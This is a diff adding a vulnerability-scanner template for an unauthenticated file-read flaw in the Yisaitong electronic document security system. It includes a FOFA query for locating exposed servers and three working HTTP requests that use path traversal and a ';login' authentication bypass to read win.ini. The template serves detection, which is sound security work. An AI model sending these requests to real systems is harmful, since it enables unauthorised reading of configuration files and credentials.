@@ -1,0 +1,51 @@
+id: yisaitong-UploadFileManagerService_RestoreFiles_downloadfromfile-File-reading
+
+info:
+  name: "亿赛通电子文档安全管理系统 UploadFileManagerService 等接口未授权文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/CDGServer3/index.jsp"
+      亿赛通电子文档安全管理系统在 UploadFileManagerService、RestoreFiles、downloadfromfile 等接口实现中存在文件访问控制缺陷。攻击者可通过构造特定请求路径，绕过身份验证机制读取任意受限文件内容。该漏洞允许远程获取系统配置文件、敏感业务数据及凭证信息，导致数据泄露风险并破坏系统整体安全防护体系。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/141108810
+  tags: 亿赛通电子文档安全管理系统
+
+
+http:
+- raw:
+  - |
+    POST /CDGServer3/downloadfromfile HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    fileName=../../../../../../../../../../../windows/win.ini
+
+  - |
+    POST /CDGServer3/document/UploadFileManagerService;login HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    command=ViewUploadFile&filePath=c:/windows/win.ini&fileName1=hello
+
+  - |
+    POST /CDGServer3/document/RestoreFiles;login HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    command=DownloadDoc&fileNameForDownload=&downPath=c:/windows/win.ini
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '; for 16-bit app support'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
